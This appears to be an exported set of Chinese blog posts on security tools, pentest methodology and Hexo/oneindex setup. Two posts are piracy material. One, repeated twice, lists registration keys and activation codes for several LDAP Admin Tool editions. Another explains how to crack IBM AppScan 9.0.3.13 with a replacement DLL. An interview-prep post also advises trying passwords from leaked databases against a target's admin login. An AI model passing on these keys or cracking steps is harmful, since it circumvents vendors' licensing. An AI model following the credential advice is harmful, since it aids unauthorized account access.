    <url>%2F2019%2F08%2F22%2Fpicbed-GitHub%E6%89%93%E9%80%A0%E8%87%AA%E5%B7%B1%E7%9A%84%E5%9B%BE%E5%BA%8A%2F</url>
    <content type="text"><![CDATA[0x00 前言很多朋友之前使用七牛云作为自己博客的图床，但是在试用域名到到期后，所有的图片都挂掉了，造成了不必要的麻烦。今天给大家介绍 picbed+GitHub打造一个专属于自己的图床，将所有的图片都托管到GitHub上，写作时，只需要功按几个快捷键就可以完成图片的上传和展示，让你爱上创作。 0x01 前期准备 需要的东西： GitHub账号 picbed图床工具 1.1 GitHub账号申请出门右拐百度 1.2 新建图床仓库点击 git 主页右上角的 + 创建 New repository； 填写仓库信息，例如我就创建了一个 cloudimg 的仓库。这里注意，仓库得设置为 Public 因为后面通过客户端访问算是外部访问，因此无法访问 Private ，这样的话图片传上来之后只能存储不能显示。所以要设置为 Public。 1.3 创建 token 并复制保存此时仓库已经建立，点击右上角头像，然后进入设置； 然后拉到下方创建，创建成功后，会出现下方的一串token，记得要复制，只会出现一次，不过实在忘记的话，可以删除了重新创建一个。 0x02 PicGo 客户端配置2.1 PicGod的下载安装PicGo （目前 2.0.4）是一个开源的图床工具，非常优秀。可以到 git 上下载，但下载速度太慢，所以我放了一个百度云的链接，速度快很多。 git地址：PicGo Win版下载链接：百度云 密码：PicG ##2.2 PicGod的配置 注意：设置自定义域名不要填，不然会一直提示上传图片失败，具体原因我也不知道为什么，在网上找的教程都配置了，但是我配置了以后上传图片总是失败，也算是一个大坑了， 2.3 快捷键的设置 想用什么快捷键只需要在键盘上安装几个键然后点击确定就行了，我这里的快捷键是Ctrl+Shift+C 开启开机自启和使用时间戳将上传的文件重命名 安装插件配置好上传快捷键以后，还需要安装一个autocopy插件，该插件可以在你上传成功后，自动生成Markdown语法的图片链接到剪切板，只需要复制到Markdown编辑器就可以预览图片，简直方便至极。只需搜索安装就行了。 上传成功的相册专区 如果图片的Markdown链接没有自动复制到剪切板，只需要在相册中重新点击一下对应图片下方的复制按钮即可。 0x03 吐槽通过上面的操作，我们已经可以成功的将图片上传到GitHub了，但是有一点不得不吐槽一下，就是GitHub毕竟是国外的，所以我们上传到GitHub的图片加载的速度会有点慢，所以我就研究了一下微博图床，毕竟微博是国内的，然后就有了下面的事件。 配置好微博的图床 很开心的上传了图片，然后使用hexo本地加载一切正常，但是很奇怪的是部署到博客中的时候，浙西图片全部都显示404，我当时的心情是这样的。 然后我又不得不重新将图片的链接换成了GitHub图床上的链接才恢复正常。 0x04 参考链接https://www.jianshu.com/p/9d91355e8418 ###]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>图床</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LDAP-Admin-Tools工具安装激活教程]]></title>
    <url>%2F2019%2F08%2F22%2FLDAP-Admin-Tools%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85%E6%BF%80%E6%B4%BB%E6%95%99%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[0x00 前言在渗透测试的过程中，我们有可能会碰到LDAP匿名访问漏洞，为了验证漏洞的存在，需要使用LDAP访问工具来连接尝试是否可以正常访问。下面来给大家分享一下工具的安装激活教程。 0x01 下载安装LDAP下载：传送门 ,选择相应的系统版统下载 下载完成后傻瓜式安装，一直点下一步即可，需要改变安装位置的自定义安装位置就好了。 0x02 激活信息 不同版本的软件激活信息 2.1 LDAP Admin Tool(Professional Edition)123email&quot;:&quot;myluamas@gmail.com&quot;,&quot;registrationKey&quot;:&quot;VW1wR2RGbFZUWGhqZWtaMFpWZDRNVmxYTVdoak1FSnVZbGRHY0dKRE5XcGlNakZFVFZSck5VOVVRVFJNZWtFMFRIcE5kMDFVYXowPQ==&quot;,&quot;activationCode&quot;:&quot;STARTTIMEGMT1565258022000-4718858022000&quot; 2.2 LDAP Admin Tool(Standard Edition)123&quot;email&quot;:&quot;myluamas@gmail.com&quot;,&quot;registrationKey&quot;:&quot;VW1wR2RGbFZUWGhqZWtaMFpWZDRNVmxYTVdoak1FSnVZbGRHY0dKRE5XcGlNakZFVFZSck5VOVVRVFJNZWtFMFRIcE5kMDFVYXowPQ==&quot;,&quot;activationCode&quot;:&quot;STARTTIMEGMT1565258022000-4718858022000&quot; 2.3 AD Admin &amp; Reporting Tool123&quot;email&quot;:&quot;myluamas@gmail.com&quot;,&quot;registrationKey&quot;:&quot;VVZWU1UxSnFSblJaVlUxNFkzcEdkR1ZYZURGWlZ6Rm9ZekJDYm1KWFJuQmlRelZxWWpJeFFsSkdTa1JOVkdzMVQxUkJORXg2UVRSTWVrMTNUVlJyUFE9PQ==&quot;,&quot;activationCode&quot;:&quot;STARTTIMEGMT1565258896000-4718858896000&quot; 2.4 LDAP Plus AD HelpDesk Professional Tool123&quot;email&quot;:&quot;myluamas@gmail.com&quot;,&quot;registrationKey&quot;:&quot;VW1wR2RFMTZVVEZXVjJ4dVlVZFNiV0ZIUm10YWJWSjBaVmQ0TVZsWE1XaGpNRUp1WWxkR2NHSkROV3BpTWpBeVRqQm9TV1JZYkd0VFIxWnpZMFJCTkV4NlFUUk1lazEzVFZSclBRPT0=&quot;,&quot;activationCode&quot;:&quot;STARTTIMEGMT1565259420000-4718859420000&quot; 2.5 LDAP Admin &amp; Reporting Tool123&quot;email&quot;:&quot;myluamas@gmail.com&quot;,&quot;registrationKey&quot;:&quot;VkVWU1FsVkdTa2ROVnpGb1VYcEdlazFYTVRWaVNGWm9ZbGRHZWxGSFpIUlpWMnh6VEcxT2RtSlZlRVZSVmtKVFVYcEZOVTlVYTNkUFF6aDNUME00ZWsxRVJUVT0=&quot;,&quot;activationCode&quot;:&quot;STARTTIMEGMT1565259450000-4718859450000&quot; 2.6 AD Admin Tool12345&quot;email&quot;:&quot;myluamas@gmail.com&quot;,&quot;registrationKey&quot;:&quot;VVZWU1IwMVhNV2hSZWtaNlRWY3hOV0pJVm1oaVYwWjZVVWRrZEZsWGJITk1iVTUyWWxWR1JWRjZSVFZQVkd0M1QwTTRkMDlET0hwTlJFVTE=&quot;,&quot;activationCode&quot;:&quot;STARTTIMEGMT1565259487000-4718859487000&quot; 0x03 激活步骤打开软件后找到工具栏上的license 然后填上对应版本的激活邮箱和key 填好后点击next需要继续输入activationCode ，在我给的激活信息里面 激活完成以后重启软件会发现菜单栏上面的剩余时间29天没有了]]></content>
      <categories>
        <category>安全工具</category>
      </categories>
      <tags>
        <tag>LADP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LDAP-Admin-Tools工具安装激活教程]]></title>
    <url>%2F2019%2F08%2F22%2FLDAP%E5%8C%BF%E5%90%8D%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[0x00 前言在渗透测试的过程中，我们有可能会碰到LDAP匿名访问漏洞，为了验证漏洞的存在，需要使用LDAP访问工具来连接尝试是否可以正常访问。下面来给大家分享一下工具的安装激活教程。 0x01 下载安装LDAP下载：传送门 ,选择相应的系统版统下载 下载完成后傻瓜式安装，一直点下一步即可，需要改变安装位置的自定义安装位置就好了。 0x02 激活信息 不同版本的软件激活信息 2.1 LDAP Admin Tool(Professional Edition)123email&quot;:&quot;myluamas@gmail.com&quot;,&quot;registrationKey&quot;:&quot;VW1wR2RGbFZUWGhqZWtaMFpWZDRNVmxYTVdoak1FSnVZbGRHY0dKRE5XcGlNakZFVFZSck5VOVVRVFJNZWtFMFRIcE5kMDFVYXowPQ==&quot;,&quot;activationCode&quot;:&quot;STARTTIMEGMT1565258022000-4718858022000&quot; 2.2 LDAP Admin Tool(Standard Edition)123&quot;email&quot;:&quot;myluamas@gmail.com&quot;,&quot;registrationKey&quot;:&quot;VW1wR2RGbFZUWGhqZWtaMFpWZDRNVmxYTVdoak1FSnVZbGRHY0dKRE5XcGlNakZFVFZSck5VOVVRVFJNZWtFMFRIcE5kMDFVYXowPQ==&quot;,&quot;activationCode&quot;:&quot;STARTTIMEGMT1565258022000-4718858022000&quot; 2.3 AD Admin &amp; Reporting Tool123&quot;email&quot;:&quot;myluamas@gmail.com&quot;,&quot;registrationKey&quot;:&quot;VVZWU1UxSnFSblJaVlUxNFkzcEdkR1ZYZURGWlZ6Rm9ZekJDYm1KWFJuQmlRelZxWWpJeFFsSkdTa1JOVkdzMVQxUkJORXg2UVRSTWVrMTNUVlJyUFE9PQ==&quot;,&quot;activationCode&quot;:&quot;STARTTIMEGMT1565258896000-4718858896000&quot; 2.4 LDAP Plus AD HelpDesk Professional Tool123&quot;email&quot;:&quot;myluamas@gmail.com&quot;,&quot;registrationKey&quot;:&quot;VW1wR2RFMTZVVEZXVjJ4dVlVZFNiV0ZIUm10YWJWSjBaVmQ0TVZsWE1XaGpNRUp1WWxkR2NHSkROV3BpTWpBeVRqQm9TV1JZYkd0VFIxWnpZMFJCTkV4NlFUUk1lazEzVFZSclBRPT0=&quot;,&quot;activationCode&quot;:&quot;STARTTIMEGMT1565259420000-4718859420000&quot; 2.5 LDAP Admin &amp; Reporting Tool123&quot;email&quot;:&quot;myluamas@gmail.com&quot;,&quot;registrationKey&quot;:&quot;VkVWU1FsVkdTa2ROVnpGb1VYcEdlazFYTVRWaVNGWm9ZbGRHZWxGSFpIUlpWMnh6VEcxT2RtSlZlRVZSVmtKVFVYcEZOVTlVYTNkUFF6aDNUME00ZWsxRVJUVT0=&quot;,&quot;activationCode&quot;:&quot;STARTTIMEGMT1565259450000-4718859450000&quot; 2.6 AD Admin Tool“email”:”myluamas@gmail.com“, “registrationKey”:”VVZWU1IwMVhNV2hSZWtaNlRWY3hOV0pJVm1oaVYwWjZVVWRrZEZsWGJITk1iVTUyWWxWR1JWRjZSVFZQVkd0M1QwTTRkMDlET0hwTlJFVTE=”, “activationCode”:”STARTTIMEGMT1565259487000-4718859487000” 0x03 激活步骤打开软件后找到工具栏上的license 然后填上对应版本的激活邮箱和key 填好后点击next需要继续输入activationCode ，在我给的激活信息里面 激活完成以后重启软件会发现菜单栏上面的剩余时间29天没有了]]></content>
      <categories>
        <category>安全工具</category>
      </categories>
      <tags>
        <tag>LADP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[AppScan 9.0.3.13 破解版本安装教程]]></title>
    <url>%2F2019%2F08%2F21%2FAppScan-9-0-3-13-%E7%A0%B4%E8%A7%A3%E7%89%88%E6%9C%AC%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[0x00 前言最近AppScan 9.0.3.13 版本发布，国内已经以后大佬破解成功了，下面来给大家讲讲如何安装和破解的。 0x01 AppScan简介IBM AppScan是一款非常好用且功能强大的Web 应用安全测试工具，曾以 Watchfire AppScan的名称享誉业界，Rational AppScan 可自动化 Web 应用的安全漏洞评估工作，能扫描和检测所有常见的 Web 应用安全漏洞，例如 SQL注入（SQL-injection）、跨站点脚本攻击（cross-site scripting）、缓冲区溢出（buffer overflow）及最新的 Flash/Flex 应用及 Web 2.0 应用曝露等方面安全漏洞的扫描。 0x02 开始安装下载：百度网盘传送门 密码：zkyy 下载完成后解压出来 双击文件夹中的.exe文件 出现下面这个原因是因为没有安装.net框架，而APPscan是需要这个框架环境的。所以软件会自动帮我们下载框架安装。 框架下载中，耐性等待，可能时间会有点长。 安装完框架以后会提示是否立即重启，点击立即重启就好 重启过后，再次进入安装界面 一切默认即可 耐心等待一会，等待安装完成 0x03 开始破解将下载的压缩包中的另个压缩包解压出来，复制里面的dll文件到APPscan的安装目录下 进入APPscan的默认安装路径，如果是自己自定义的目录的话，找到就行 1C:\ProgramFiles (x86)\IBM\AppScan Standard 然后打开APPscan,按照下面的操作导入证书 破解完成 0x04 总结安装破解基本操作。一顿默认配置，搞定。哈哈哈哈 新版老本对比了一下，创建扫描的界面修改了一下 增加了云扫描 其他的，大家自己与研究吧 附上官方教程视频]]></content>
      <categories>
        <category>安全工具</category>
      </categories>
      <tags>
        <tag>APPscan</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试面试宝典]]></title>
    <url>%2F2019%2F08%2F20%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95%E5%AE%9D%E5%85%B8%2F</url>
    <content type="text"><![CDATA[0x00 前言随着科学技术的发展，网络安全已经提升到了国家层面。习大大说：“没有网络安全就没有国家安全。”那么在网络安全大热的今天，如何才能历经重重磨难才能达到公司需要的高度，才能符合面试官的口味,才能在众多才子中脱颖而出尼？那就好好看看博主这篇面试宝典吧，内容均是从网络上采集或者自己总结，有问题希望大家可以指出，一起进步！nice~ 0x01 简述漏洞挖掘的思路1. 1 信息收集1234567服务器的相关信息（真实ip，系统类型，版本，开放端口，WAF等）网站指纹识别（包括，cms，cdn，证书等），dns记录whois信息，姓名，备案，邮箱，电话反查（邮箱丢社工库，社工准备等）子域名收集，旁站，C段等google hacking针对化搜索，pdf文件，中间件版本，弱口令扫描等扫描网站目录结构，爆后台，网站banner，测试文件，备份等敏感文件泄漏等传输协议，通用漏洞，exp，github源码等 1.2 漏洞挖掘123浏览网站，看看网站规模，功能，特点等端口，弱口令，目录等扫描,对响应的端口进行漏洞探测，比如 rsync,心脏出血，mysql,ftp,ssh弱口令等。XSS，SQL注入，上传，命令注入，CSRF，cookie安全检测，敏感信息，通信数据传输，暴力破解，任意文件上传，越权访问，未授权访问，目录遍历，文件 包含，重放攻击（短信轰炸），服务器漏洞检测，最后使用漏扫工具等 1.3 漏洞利用&amp;权限提升123mysql提权，serv-u提权，oracle提权windows 溢出提权linux脏牛,内核漏洞提权 1.4 清除测试数据&amp;输出报告12日志、测试数据的清理总结，输出渗透测试报告，附修复方案 1.5 复测1验证并发现是否有新漏洞，输出报告，归档 0x02 面试题（一）2.1 拿到一个待检测的站，你觉得应该先做什么？2.1.1 信息收集1234561、获取域名的whois信息,获取注册者邮箱姓名电话等，丢社工库里看看有没有泄露密码，然后尝试用泄露的密码进行登录后台。用邮箱做关键词进行丢进搜索引擎。利用搜索到的关联信息找出其他邮箱进而得到常用社交账号。社工找出社交账号，里面或许会找出管理员设置密码的习惯 。利用已有信息生成专用字典。2、查询服务器旁站以及子域名站点，因为主站一般比较难，所以先看看旁站有没有通用性的cms或者其他漏洞。3、查看服务器操作系统版本，web中间件，看看是否存在已知的漏洞，比如IIS，APACHE,NGINX的解析漏洞4、查看IP，进行IP地址端口扫描，对响应的端口进行漏洞探测，比如 rsync,心脏出血，mysql,ftp,ssh弱口令等。5、扫描网站目录结构，看看是否可以遍历目录，或者敏感文件泄漏，比如php探针6、google hack 进一步探测网站的信息，后台，敏感文件 如何扩大攻击面呢？1.收集尽量全的企业域名（包括各种子域名以及子公司的域名，越全越好）2.收集尽量全的企业申请的公网 IP3.对所有收集到的域名以及 IP 地址进行端口扫描（由于时间可能比较久，所以可以选择利用 zoomeye、shodan、censys 等平台）4.针对不同的服务进行对应的渗透测试（尤其是可能存在漏洞的中间件） 0x030x04 参考链接https://mp.weixin.qq.com/s/OXo4sli37NmzzCrh4h6wYQ https://github.com/Mr-xn/BurpSuite-collections/blob/master/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%982019%E7%89%88.md ###]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>面试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[web应用程序测试方法论]]></title>
    <url>%2F2019%2F08%2F19%2Fweb%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95%E8%AE%BA%2F</url>
    <content type="text"><![CDATA[0x00 前言今天给大家分享一个web应用程序测试方法论的思维导图，希望大家可以通过思维导图理清自己测试的思路，查缺补漏，然后在总结出自己的方法论，欢迎大家和我交流。 ###]]></content>
      <categories>
        <category>思维导图</category>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>方法论</tag>
        <tag>应用程序测试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[burp加载jython时出错]]></title>
    <url>%2F2019%2F08%2F19%2Fburp%E5%8A%A0%E8%BD%BDjython%E6%97%B6%E5%87%BA%E9%94%99%2F</url>
    <content type="text"><![CDATA[0x00 前言今天在安装burpsuite中的jpython环境时，出现了问题，这里记录一下，防止下次再次出现问题时不知所措。 0x01 问题描述具体环境配置如下，路径都是正确的 勾选插件时出现下面的情况 0x02 问题原因jar包出现了问题，重新下载jar包完美解决问题 加载出错的jar包 官网下载的jar包 可以从文件的大小中就可以看出来，jar包有问题。 0x03 解决步骤第一步：去官网重新下载jython 的jar包文件 https://www.jython.org/downloads.html 第二步：将下载的jar包文件放到burp安装包路径下或者其他目录下也可以 注：必须示纯英文的路径，不能是中文路径，否则会出现错误。 第三步：重新导入jar包，路径需要正确，如下： 小技巧：输入法状态切换到英文输入模式下，然后按j，即可快速定位需要找到的文件。 重新加载，成功了。 0x04 总结在遇到问题时，不要慌张，先去百度，google等搜索引擎搜索一下，看看是否有前人的解决方法，这样可以快速的解决问题，如果没有找到相关的解决方法，可以通过错误信息的提示，逐一排查，找到可能的错误点 ###]]></content>
      <categories>
        <category>安全工具</category>
      </categories>
      <tags>
        <tag>解决问题</tag>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nessus数据库崩溃问题]]></title>
    <url>%2F2019%2F08%2F19%2Fnessus%E6%95%B0%E6%8D%AE%E5%BA%93%E5%B4%A9%E6%BA%83%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[0x00 前言今天想用nessus扫描器扫描一下系统，看看有没有什么漏洞，但是打开浏览器的时候发现，提示数据库崩溃了。 然后上网百度，貌似在百度贴吧中找到了答案，然后，为了给以后的自己和碰到同样问题的朋友看，我在给大家讲讲吧。 0x01 问题描述在浏览器中打开nessus时，提示下面错误， Corrupt Database A corrupt database has been detected which prevents Nessus from running. Please take the following corrective actions: 图片详情 0x02 解决方法 按win+R ，输入services.msc 找到tenable nessus服务，右击停止服务 在nessus的安装目录中，找到global.db文件，直接剪切到桌面或者删掉，或者大家实在找不到该文件的话，可以下载一个everything快速搜索软件，可以快速的搜索到这个软件 再次启动nessus服务 刷新浏览器，等舒适化完成，舒服Nessus，Nessus账号密码，成功登陆系统。 0x03 总结出现问题，先不要慌张，因为，你应该不是第一个碰到这个问题的人，so，百度，Google，寻找答案，之所谓：授人予鱼，不如授人于渔。方法告诉你了，下次要记得的多百度寻找答案奥！: D]]></content>
      <categories>
        <category>安全工具</category>
      </categories>
      <tags>
        <tag>解决问题</tag>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[第一章：应用程序及表单风险（渗透测试方法论）]]></title>
    <url>%2F2019%2F08%2F19%2F%E7%AC%AC%E4%B8%80%E7%AB%A0%EF%BC%9A%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E5%8F%8A%E8%A1%A8%E5%8D%95%E9%A3%8E%E9%99%A9%2F</url>
    <content type="text"><![CDATA[0x00 前言渗透测试对于每个人来说，测试的思路都不一样，但是大体思路还是信息收集-&gt;漏洞扫描-&gt;漏洞利用-&gt;权限提升-&gt;清理痕迹-&gt;输出报告。不过企业中的灰盒测试一般都是主要漏洞挖掘为主，这样的话，就需要有一个测试的方法论在进行测试了。so，这里给大家整理出渗透测试的方法论分享给大家。 0x01 搜索可见的内容一般情况下，手动浏览就可以确定应用程序的大部分内容和功能。浏览应用程序的基本方法是从初始页面开始，依次浏览每一个链接和所有的多阶段功能。但是为了仔细检查枚举的内容，全面记录每一项确定的功能，简单的浏览就不再能满足我们的需求，有必要使用更加先进的工具。 （1）首先配置浏览器，使用代理工具，可以使用BurpSuite等工具监控和解析由代理服务器处理的Web内容，对站点实行被动抓取。 首先开启代理，然后打开Burpsuite并找到Target下的Site map 访问目标网站，对其进行自动爬取，由于完全自动化的方法在内容枚举方面还有一定的限制，例如 身份验证时爬虫的一些操作会让通过验证的会话中断； 向某个敏感内容提交无效输入，应用程序可能会自我防御，终止会话； 多阶段功能往往会严格的执行输入确认检查，可能不会接受自动工具提交的值； 爬虫可能会发现并使用敏感功能，造成重大损失等等。 所以更多的时候我们选择进行指定爬取，即用户通过常规方式浏览应用程序，来枚举应用程序的所有功能，生成的流量穿过一个组合拦截代理服务器与爬虫的工具，监控所有请求和响应，并且像一个正常的应用程序感知爬虫那样来分析应用程序的响应，BurpSuite中的爬虫就有这种用途。 （3）接下来进行指定爬取 ​ 以常规方式浏览整个应用程序，访问发现的每一个url，提交每一个表单并执行全部多阶段功能，尝试在JavaScript激活与禁用、cookie激活与禁用的情况下浏览。 如何禁用cookie ​ 打开设置，找到Privacy，点击Firefox will右边的下拉菜单，选择use custom settings for history，然后将Accept cookies from sites前面的√去掉 如何禁用JavaScript ​ 在地址栏输入about:config，点击 I accept the risk！ 搜索javascript，找到javascript.enable，双击关闭 4）完成手动浏览和被动抓取以后，可以用一组发现的url作为种子，使用爬虫抓取应用程序。有时候这样可以发现其他在手动浏览时忽略的内容。在进行自动抓取前，首先应确定任何危险的或可能会中断应用程序会话的url，并配置爬虫，将它们排除在抓取范围之外。 PS：许多Web服务器的根目录下有一个名为robots.txt的文件，其中列出了站点不希望Web爬虫访问或搜索引擎列入索引的url。有时候这个文件中可能会包含一些敏感信息，这些信息很可能会危机Web程序的安全。 0x02 浏览公共资源（1）使用因特网搜索引擎和历史档案，确定它们编入索引或保存的与目标应用程序有关的内容。 例如使用Wayback Machine查看历史档案 随便搜索一个网站，就用我们团队的网站来测试，可以看到不同的时间节点有保存的快照信息。 使用高级搜索提高效率。例如，在Google中，可以使用site:获取所有与目标站点有关的内容，使用link:获取链接到目标站点的其他站点。如果在搜索过程中找到现有应用程序已经删除的内容，仍然可以从搜索引擎的缓存中查看这些内容。这些已经被删除的内容中可能包含尚未删除的其他资源的链接。 使用site: 目标站点进行搜索 site:www.baidu.com将返回Google引用的每一个目标站点的资源 site:www.baidu.com inurl:login将返回所有包含login表达式的页面。在大型且复杂的应用程序中，可以快速定位感兴趣的资源，如管理菜单、密码重置等功能 使用link:进行搜索 link:www.wandouxueyuan.com返回其他Web站点和应用程序中所有包含目标站点的链接的页面，其中包括过去内容的链接或仅第三方可用的功能。 使用related进行搜索 related:www.tencent.com它将返回与目标站点“相似”的页面，可能会包含大量的无关资料，但是也可能包含在其他站点与目标有关的讨论，可能会有所帮助。 （3）搜索在应用程序内容[如联系信息，包括并未在屏幕上显示的内容(如HTML注释)]中发现的任何姓名与电子邮件地址。除Web搜索外，还应进行新闻和分组搜索。在论坛上寻找与目标应用程序及其支持基础架构有关的所有技术信息。 此处使用evilscience靶机作为检索对象 在这个网站中有很多的注释，当然这些注释没有什么用，此处只是为了演示 在一些安全性不是很强的网站里面还会直接找到用户名 例如： 新闻搜索： （4）检查已发布的任何WSDL文件，以生成应用程序可能采用的功能名称和参数值列表。 0x03 发现隐藏内容0x04 查找默认的内容0x05 枚举标识符制定的功能0x06 调试参数0x07 调试参数0x08 确定数据输入点0x09 确定所使用的技术0x10 解析受攻击面0x11 通过客户端传送数据0x12 客户端输入控件###]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>方法论</tag>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hexo蝴蝶主题的一些小功能(跟新中)]]></title>
    <url>%2F2019%2F08%2F18%2Fhexo%E8%9D%B4%E8%9D%B6%E4%B8%BB%E9%A2%98%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E5%8A%9F%E8%83%BD-%E8%B7%9F%E6%96%B0%E4%B8%AD%2F</url>
    <content type="text"><![CDATA[0x00 前言在从使用next主题后，因为博客的加载缓慢问题，让我再次放弃的这个主题，而偶然的看到同事使用的蝴蝶主题，让我欢喜不已。因为这个主题真的太好看了，一下子吸引了我，而且整个博客加载的速度也是非常的快。不过由图床使用的是GitHub的图床，所有在图片加载这个方面还是有点慢。不过整理影响不是很大。这篇文章来给大家介绍一下，换了蝴蝶 主题后的一些小功能细节问题。 0x01 导航栏图标问题导航栏栏图片，就是在导航栏的文字前面都有对应的小图标，不知道有没有人和我一样，因为增加了导航栏的功能菜单，但是苦苦的找不到对应的图标，让博客看起来不是很好看。 效果预览 实现步骤访问font_awesome网站，主页如下 搜索想要的图标，比如电影 复制电影的代码 在主题的配置文件下替换掉后面的标识 然后刷新一下浏览器就能看到了 效果查看 0x02 分类目录二级目录不知道大家有没有这样的苦恼，就是在写文章的时候，把很多文章都归类到一个大类中，到最后自己找文章的时候都不太好找，但是如果我们将文章都归类到一个二级分类，然后二级分类在归类到一级分类，这样的话是不是找起来更方便一点尼。 效果预览 实现步骤在每次写文章的时候，categories按照如下格式书写。第一个为一级，第二个为二级。理论上来说，还可以添加3级，4级分类目录，这个根据自己的喜好和实际需求了。 在每次写文章的时候，categories按照如下格式书写。第一个为一级，第二个为二级。 效果查看 0x03 hexo 部署出现问题在使用hexo d或者hexo deploy Mingling 时，发现不能部署。 问题描述 解决方法在博客根目录下，输入npm install --save hexo-deployer-git命令， 安装完成以后再次之行hexo deploy 一切正常 0x04 关闭page页面或者特定文章的评论我们在写文章的时候，经常可能会碰到有些文章不需要增加评论的功能，那怎么去实现尼，其实hexo早就想到这点了，实现很简单，一条命令即可。 实现步骤只要在文章的md或者page的md文件头中加入comments: false即可 注意：是comments 不是comment，单词别写错，第二个，false前面有一个空格 0x05 给Hexo正确添加RSS订阅安装feed插件在博客的根目录下输入npm install hexo-generator-feed命令安装，然后等待安装完成 添加配置文件打开站点配置文件_config.yml，末尾添加以下配置 12345678910 # Extensions## Plugins: http://hexo.io/plugins/#RSS订阅plugin:- hexo-generator-feed#Feed Atomfeed:type: atompath: atom.xmllimit: 20 打开主题配置文件_config.yml，按Ctrl+F 搜索rss，添加配置 1rss: /atom.xml 查看输入一下命令，然后刷新一下浏览器即可 123hexo cleanhexo ghexo s 0x06 修改阅读时长，文章热度实现步骤Butterfly/languages/zh-CN.yml 下，搜索post，然后按照下图修改即可 效果显示]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>主题功能</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[oneindex后续]]></title>
    <url>%2F2019%2F08%2F16%2Foneindex%E5%90%8E%E7%BB%AD%2F</url>
    <content type="text"><![CDATA[0x00 前言​ 在前一篇文章《使用onedrive+oneindex打造一个专属个人网盘》中，我们已经成功的搭建好了一个网盘了，但是这还不算完美，还需要增加一些小细节，比如文件夹加密，文件夹描述，云盘底部介绍等等，下面就来给大家讲讲如何实现。 0x01 实现文件夹加密功能实现文件夹加密的功能非常简单，原理就是在需要加密的文件夹中创建一个.password的文件，然后在该文件中输入自己需要设置的密码即可。但是，问题来了，我们正常情况下，Windows是不允许创建一个没有名称的文件的，提示如下。 那么，该如何解决这个问题尼？ 其实还是有方法的。比如在cmd中使用命令来直接创建该文件，就不会出现这种情况了，具体操作如下： 123cd Desktop #切换到桌面echo 123456 &gt; .password #创建.password文件，并将123456写入该文件#123456就是加密的文章夹密码 .password文件创建好后，可以上传到你想加密的文件夹，当然这个文件也可以复制到其他文件夹，这样就不需要每次重复创建了。 如果想立马看到效果的话，去oneindex后台重新刷新一下缓存， 再次访问发现成功加密文件夹，需要输入密码才能访问 ps1：这里输入密码访问成功访问后，发现后面就不用再次输入密码了，原因是浏览器记录了缓存信息，再次使用一个新的浏览器打开还是需要密码的，所以不用担心。 ps2：如果需要实现在加密的文件夹中再加密文件夹，原理还是一样的，也是在需要加密的文件夹中放入.password文件即可，这样的话，就可以给每个不同的私人文件夹放置不同的密码，即使一个文件夹的密码被猜解出来，其他文件夹也还是安全的。 0x02 网盘底部创建介绍信息这个功能实现过程非常的简单，只需要在网盘根目录中新建一个README.md文件即可，然后在该文件中写入自己需要介绍的信息。 0x03 总结如果还有新功能，会在跟新。皮卡皮卡^v^ ###]]></content>
      <categories>
        <category>教程</category>
        <category>好玩</category>
      </categories>
      <tags>
        <tag>oneindex</tag>
        <tag>onedrive</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何将*.frm，*.MYD和*.MYI格式的文件导入MySQL中]]></title>
    <url>%2F2019%2F08%2F14%2F%E5%A6%82%E4%BD%95%E5%B0%86-frm%EF%BC%8C-MYD%E5%92%8C-MYI%E6%A0%BC%E5%BC%8F%E7%9A%84%E6%96%87%E4%BB%B6%E5%AF%BC%E5%85%A5MySQL%E4%B8%AD%2F</url>
    <content type="text"><![CDATA[0x00 前言​ 在学mysql数据库的时候，可能有小伙伴经常碰到.frm, .MYD，.MYI 的文件，但是却不知道如何还原其中的数据，今天博客也是碰到了一样的问题，经过在晚上一番搜索后，成功还原了，在这里记录一下，然后分享给大家。 0x01 操作步骤创建数据库 1CREATE DATABASE test2 执行成功 刷新数据库 利用PHPstudy找到mysql数据库的安装路径，然后找到data文件夹 将.frm，.MYD和*.MYI的文件都复制到刚刚创建的数据库文件夹中 再次回到小海豚中刷新数据库，发现表已经出现了 然后，然后就能看到数据库。哇卡卡。 0x02 踩坑说明 我自己在虚拟机中单独安装了mysql5.5的数据库，然后使用小海豚进行连接，但是发现，创建数据库的时候，在mysql的数据库安装文件夹的data中没有出现最新创建的数据库文件夹，。。。。郁闷，为啥每次这些坑都会被我碰到。。。， 解决方法：我想起来PHPstudy中集成了mysql，于是，我直接卸载了mysql，直接安装了PHPstudy，然后成功还原了数据库。]]></content>
      <categories>
        <category>数据库</category>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>mysql</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[onedrive+oneindex打造属于自己的个人网盘]]></title>
